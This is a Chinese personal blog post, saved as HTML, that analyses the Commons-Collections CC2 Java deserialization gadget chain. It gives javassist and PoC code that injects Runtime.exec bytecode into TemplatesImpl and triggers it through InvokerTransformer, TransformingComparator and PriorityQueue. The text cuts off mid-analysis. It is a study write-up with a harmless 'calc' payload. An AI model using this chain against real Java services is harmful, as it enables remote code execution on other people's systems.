@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"little-gu.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="CC2javassist学习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cc2链">
+<meta property="og:url" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="CC2javassist学习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import ja">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/2.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/3.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/4.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/5.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/6.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/7.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/8.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/9.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/10.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/11.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/12.png">
+<meta property="article:published_time" content="2021-03-19T13:28:25.000Z">
+<meta property="article:modified_time" content="2021-03-19T14:37:06.349Z">
+<meta property="article:author" content="热爱篮球和安全的小伙子">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/1.png">
+
+
+<link rel="canonical" href="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>cc2链 | hungry and humble</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">hungry and humble</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC2"><span class="nav-number">1.</span> <span class="nav-text">CC2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#javassist%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.1.</span> <span class="nav-text">javassist学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step1"><span class="nav-number">1.2.</span> <span class="nav-text">step1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step2"><span class="nav-number">1.3.</span> <span class="nav-text">step2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step3"><span class="nav-number">1.4.</span> <span class="nav-text">step3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step4"><span class="nav-number">1.5.</span> <span class="nav-text">step4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step5"><span class="nav-number">1.6.</span> <span class="nav-text">step5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%B7%9F%E4%B8%80%E6%B3%A2"><span class="nav-number">1.7.</span> <span class="nav-text">正向跟一波</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="热爱篮球和安全的小伙子"
+      src="/uploads/ckrie.jpg">
+  <p class="site-author-name" itemprop="name">热爱篮球和安全的小伙子</p>
+  <div class="site-description" itemprop="description">记录我的学习之旅</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/ckrie.jpg">
+      <meta itemprop="name" content="热爱篮球和安全的小伙子">
+      <meta itemprop="description" content="记录我的学习之旅">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hungry and humble">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cc2链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-03-19 21:28:25 / Modified: 22:37:06" itemprop="dateCreated datePublished" datetime="2021-03-19T21:28:25+08:00">2021-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="javassist学习"><a href="#javassist学习" class="headerlink" title="javassist学习"></a>javassist学习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">javassist使用</span></span><br><span class="line"><span class="comment">主要类</span></span><br><span class="line"><span class="comment">ClassPool:基于哈希表实现的CtClass对象容器，键名是类名称，值是该类CtClass对象</span></span><br><span class="line"><span class="comment">常用方法：</span></span><br><span class="line"><span class="comment">static ClassPool     getDefault()</span></span><br><span class="line"><span class="comment">       返回默认的类池。</span></span><br><span class="line"><span class="comment">ClassPath     insertClassPath(java.lang.String pathname)</span></span><br><span class="line"><span class="comment">       在搜索路径的开头插入目录或jar（或zip）文件。</span></span><br><span class="line"><span class="comment">ClassPath     insertClassPath(ClassPath cp)</span></span><br><span class="line"><span class="comment">       ClassPath在搜索路径的开头插入一个对象。</span></span><br><span class="line"><span class="comment">java.lang.ClassLoader      getClassLoader()</span></span><br><span class="line"><span class="comment">       获取类加载器toClass()，getAnnotations()在 CtClass等</span></span><br><span class="line"><span class="comment">CtClass       get(java.lang.String classname)</span></span><br><span class="line"><span class="comment">       从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span></span><br><span class="line"><span class="comment">ClassPath     appendClassPath(ClassPath cp)</span></span><br><span class="line"><span class="comment">       将ClassPath对象附加到搜索路径的末尾。</span></span><br><span class="line"><span class="comment">CtClass       makeClass(java.lang.String classname)</span></span><br><span class="line"><span class="comment">       创建一个新的public类</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CtClass类；</span></span><br><span class="line"><span class="comment">常用方法</span></span><br><span class="line"><span class="comment">void   setSuperclass(CtClass clazz)</span></span><br><span class="line"><span class="comment">       更改超类，除非此对象表示接口。</span></span><br><span class="line"><span class="comment">java.lang.Class&lt;?&gt;   toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span></span><br><span class="line"><span class="comment">       将此类转换为java.lang.Class对象。</span></span><br><span class="line"><span class="comment">byte[] toBytecode()</span></span><br><span class="line"><span class="comment">       将该类转换为类文件。</span></span><br><span class="line"><span class="comment">void   writeFile()</span></span><br><span class="line"><span class="comment">       将由此CtClass 对象表示的类文件写入当前目录。</span></span><br><span class="line"><span class="comment">void   writeFile(java.lang.String directoryName)</span></span><br><span class="line"><span class="comment">       将由此CtClass 对象表示的类文件写入本地磁盘。</span></span><br><span class="line"><span class="comment">CtConstructor makeClassInitializer()</span></span><br><span class="line"><span class="comment">       制作一个空的类初始化程序（静态构造函数）。</span></span><br><span class="line"><span class="comment">CtMethod</span></span><br><span class="line"><span class="comment">CtMethod：表示类中的方法。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CtConstructor</span></span><br><span class="line"><span class="comment">CtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数（类初始化器）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用javassis来创建一个Person类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreatClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取javassist维护的类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个空类</span></span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">        <span class="comment">//给ctClass类即public类添加一个string类型的字段</span></span><br><span class="line">        CtField name = <span class="keyword">new</span> CtField(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">//设置private权限</span></span><br><span class="line">        name.setModifiers(Modifier.PRIVATE);<span class="comment">//CtField类setModifiers方法  arg:Modifier类字段返回int类型</span></span><br><span class="line">        <span class="comment">//初始化name字段为张三</span></span><br><span class="line">        ctClass.addField(name,  CtField.Initializer.constant(<span class="string">&quot;zhangsan&quot;</span>));<span class="comment">//CtClass类addField方法 args1:CtField对象，args2:内部静态Initializer类对象</span></span><br><span class="line">        <span class="comment">//生成get,set方法</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, name));<span class="comment">//addMethod方法  args1:方法名，args2:CtField对象</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setname&quot;</span>,name));</span><br><span class="line">        <span class="comment">//添加无参构造参数</span></span><br><span class="line">        CtConstructor ctConstructor0 = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, ctClass);</span><br><span class="line">        ctConstructor0.setBody(<span class="string">&quot;&#123;name=\&quot;xiaoming\&quot;;&#125;&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(ctConstructor0);</span><br><span class="line">        <span class="comment">//添加有参构造参数</span></span><br><span class="line">        CtConstructor ctConstructor1 = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span>  CtClass[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.name=$1;&#125;&quot;</span>);<span class="comment">//设置函数构造主体，$1表示的第一个参数</span></span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line">        <span class="comment">//创建一个public方法printName()无参无返回值</span></span><br><span class="line">        CtMethod printName = <span class="keyword">new</span> CtMethod(CtClass.voidType, <span class="string">&quot;PrintName&quot;</span>, <span class="keyword">new</span>  CtClass[]&#123;&#125;, ctClass);<span class="comment">//构造方法args1:函数返回类型，函数名，无参，类名</span></span><br><span class="line">        printName.setModifiers(Modifier.PUBLIC);<span class="comment">//设置public</span></span><br><span class="line">        printName.setBody(<span class="string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);<span class="comment">//设置函数体</span></span><br><span class="line">        ctClass.addMethod(printName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入class文件</span></span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        ctClass.detach();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*      //通过反射调用person类的方法</span></span><br><span class="line"><span class="comment">        Object o = ctClass.toClass().newInstance();</span></span><br><span class="line"><span class="comment">        Method setname = o.getClass().getMethod(&quot;setname&quot;, String.class);</span></span><br><span class="line"><span class="comment">        setname.invoke(o, &quot;hungry&quot;);</span></span><br><span class="line"><span class="comment">        Method printname = o.getClass().getMethod(&quot;PrintName&quot;);</span></span><br><span class="line"><span class="comment">        printname.invoke(o);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//通过加载class文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>网上有很多javassist的文章，不再赘述。</p>
+<p>根据poc先逆向分析一波</p>
+<h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String  AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"><span class="comment">//1.创建动态一个类，设置父类添加命令执行内容</span></span><br><span class="line">ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line">payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line"><span class="comment">// 为什么要设置父类为AbstractTranslet</span></span><br><span class="line">payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br><span class="line"><span class="comment">//这里就是生成一个payload的类</span></span><br></pre></td></tr></table></figure>
+<p>这里没什么好说的，提出问题：为什么要设置父类为abstractranslet类？</p>
+<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.通过反射获取并设置templatesImpl的_bytecodes字段为runtime的byte数组,该类最终会将payuload实例化，接下来考虑怎么调用newtransformer方法</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line">Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span>  Class[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl实例</span></span><br><span class="line">Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field.set(templatesImpl,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">field1.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br></pre></td></tr></table></figure>
+<p>像cc1又需要考虑到runtime实例化的问题，为什么使用的是templatesImpl类而不是其他类来构造的原因其实和_bytecodes设置为payload字节码有关系的。</p>
+<p>跟进templatesImpl类，找到哪个方法会调用_bytecodes<br><img src="/2021/03/19/cc2%E9%93%BE/1.png" alt="1"></p>
+<p>会传递给_class,然后在getTransletInstance方法里进行实例化操作</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/2.png" alt="2"><br>到这里也就解决了runtime实例化的问题。回到提出的问题1，这里实例化后的类型是abstractranslet，这就是为什么为payload设置abstractranslet父类的原因。</p>
+<p>那么接下来的问题就是怎么调用getTransletInstance，同样是该类中的newTransformer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.通过invokeTransformer的transform(这里利用comparator类)方法调用newtransformer</span></span><br><span class="line">InvokerTransformer transformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span>  Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">TransformingComparator comparator =<span class="keyword">new</span> TransformingComparator(transformer);<span class="comment">//使用TransformingComparator修饰器传入newtransformer</span></span><br></pre></td></tr></table></figure>
+<p>这里通过反射调用newTransformer方法。<br>我们知道最终还是需要调用invokertransformer类的tranform方法，需要找到一个类里的方法能调用transform方法，TransformingComparator是一个修饰器，和CC1中的ChainedTransformer类似，里面有compare方法会调用transform方法，实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以通过PriorityQueue队列触发compare()，进一步触发transform()。继续</p>
+<h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><p>考虑如何调用compare方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个  PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line"></span><br><span class="line">Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">field2.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br></pre></td></tr></table></figure>
+<p>问题：为什么要设置该类的这个字段？注意设置的字段值传入的就是poc里的comparator实例，是需要进一步调用compare方法触发transfrom方法的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c 